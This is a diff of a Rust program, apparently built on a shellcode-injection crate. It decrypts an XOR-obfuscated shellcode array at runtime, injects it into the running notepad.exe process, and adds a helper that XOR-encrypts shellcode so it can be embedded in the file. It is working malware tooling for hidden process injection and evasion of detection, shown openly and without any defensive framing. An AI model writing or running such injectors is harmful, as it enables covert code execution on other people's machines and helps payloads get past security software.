@@ -1,5 +1,5 @@
 use needle::{
-    cypher::{PayloadCypher, XorCypher},
+    cypher::{PayloadCypher, XorCypher, XorCypherExt},
     find_process, inject, Shellcode,
 };
 
@@ -27,10 +27,16 @@ const SHELL_CODE: &[u8] = &[
 const KEY: u8 = 0x42;
 
 fn main() {
-    let payload = XorCypher::<Shellcode>::from_encrypted(SHELL_CODE, KEY);
+    let payload = XorCypher::from(SHELL_CODE.to_vec()).decrypt(&KEY);
 
     let process = find_process("notepad.exe").expect("Target process not found");
     if let Err(e) = inject(process, payload) {
         println!("Could not inject payload: {}", e);
     }
+}
+
+#[allow(dead_code)]
+fn generate_payload(shellcode: Shellcode) {
+    let payload = shellcode.into_raw().xor_encrypt(&KEY);
+    println!("Encrypted shellcode: {:#04x?}", payload);
 }
